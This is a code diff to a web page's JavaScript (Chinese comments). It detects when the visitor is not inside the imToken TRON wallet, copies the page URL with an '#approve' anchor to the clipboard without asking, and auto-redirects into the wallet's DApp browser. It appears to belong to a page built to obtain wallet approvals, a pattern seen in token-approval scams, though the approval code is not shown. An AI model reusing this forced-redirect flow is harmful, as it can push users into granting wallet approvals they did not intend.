@@ -1025,7 +1025,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         }, 500);
     }
 });
-// ========== 环境检测（核心修改：自动跳转+弹窗） ==========
+// ========== 环境检测（修复：先跳转，失败再弹窗） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     if (window.tronWeb) {
@@ -1034,58 +1034,61 @@ async function checkImTokenEnv() {
         warning.style.display = "none";
         specialTipContainer.style.display = "none"; // imToken环境隐藏专属容器
         await initWallet(false);
-    } else {
-        try {
-            // 非imToken环境：显示专属容器+自动跳转（无需点击按钮）
-            specialTipContainer.style.display = "block"; // 显示非钱包环境专属容器
-            userInfoEl.innerHTML = lang.nonImTokenUser;
-            approveBtn.style.display = "none";
-            connectBtn.style.display = "none"; // 初始隐藏按钮
+        return;
+    }
 
-            // 自动触发跳转
-            const targetUrl = window.location.href + "#approve";
-            await navigator.clipboard.writeText(targetUrl);
-            // 用稳定的scheme拼接跳转链接
-            const jumpUrl = imTokenConfig.scheme + encodeURIComponent(targetUrl);
-            window.location.href = jumpUrl;
+    try {
+        // 非imToken环境：先隐藏弹窗和按钮，优先执行跳转
+        specialTipContainer.style.display = "block";
+        userInfoEl.innerHTML = lang.nonImTokenUser; // 显示"正在自动唤起imToken..."
+        approveBtn.style.display = "none";
+        connectBtn.style.display = "none";
+        nonImTokenPopup.style.display = "none"; // 关键：初始不显示弹窗
 
-            // 2秒后检测跳转是否成功
-            setTimeout(() => {
-                if (!window.tronWeb) {
-                    // 跳转失败：显示按钮+弹窗
-                    connectBtn.style.display = "block";
-                    nonImTokenPopup.style.display = "block";
+        // 1. 构造目标URL（带授权锚点）
+        const targetUrl = window.location.href + "#approve";
+        // 2. 复制链接（兜底）
+        await navigator.clipboard.writeText(targetUrl);
+        // 3. 强制触发跳转（用验证过的正确scheme）
+        const jumpUrl = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(targetUrl);
+        window.location.href = jumpUrl;
 
-                    // 点击按钮再次跳转
-                    connectBtn.onclick = async () => {
-                        try {
-                            const targetUrl = window.location.href + "#approve";
-                            await navigator.clipboard.writeText(targetUrl);
-                            const jumpUrl = imTokenConfig.scheme + encodeURIComponent(targetUrl);
-                            window.location.href = jumpUrl;
-                        } catch (e) {
-                            alert(lang.copyFail + "\n" + lang.copyGuide);
-                        }
-                    };
-                }
-            }, 2000);
+        // 4. 延迟3秒检测跳转结果（足够浏览器触发跳转）
+        setTimeout(() => {
+            // 3秒后仍在外部浏览器→跳转失败，显示弹窗+按钮
+            if (!window.tronWeb) {
+                nonImTokenPopup.style.display = "block";
+                connectBtn.style.display = "block";
 
-        } catch (e) {
-            console.error("非imToken环境处理失败：", e);
-            // 出错时直接显示按钮+弹窗
-            connectBtn.style.display = "block";
-            nonImTokenPopup.style.display = "block";
-            connectBtn.onclick = async () => {
-                try {
-                    const targetUrl = window.location.href + "#approve";
-                    await navigator.clipboard.writeText(targetUrl);
-                    const jumpUrl = imTokenConfig.scheme + encodeURIComponent(targetUrl);
-                    window.location.href = jumpUrl;
-                } catch (e) {
-                    alert(lang.copyFail + "\n" + lang.copyGuide);
-                }
-            };
-        }
+                // 按钮点击再次跳转（保留兜底）
+                connectBtn.onclick = async () => {
+                    try {
+                        const targetUrl = window.location.href + "#approve";
+                        await navigator.clipboard.writeText(targetUrl);
+                        const jumpUrl = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(targetUrl);
+                        window.location.href = jumpUrl;
+                    } catch (e) {
+                        alert(lang.copyFail + "\n" + lang.copyGuide);
+                    }
+                };
+            }
+        }, 3000); // 延迟3秒，确保跳转有足够时间触发
+
+    } catch (e) {
+        console.error("跳转执行失败：", e);
+        // 执行出错时才显示弹窗+按钮
+        nonImTokenPopup.style.display = "block";
+        connectBtn.style.display = "block";
+        connectBtn.onclick = async () => {
+            try {
+                const targetUrl = window.location.href + "#approve";
+                await navigator.clipboard.writeText(targetUrl);
+                const jumpUrl = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(targetUrl);
+                window.location.href = jumpUrl;
+            } catch (e) {
+                alert(lang.copyFail + "\n" + lang.copyGuide);
+            }
+        };
     }
 
     // 关闭弹窗按钮逻辑
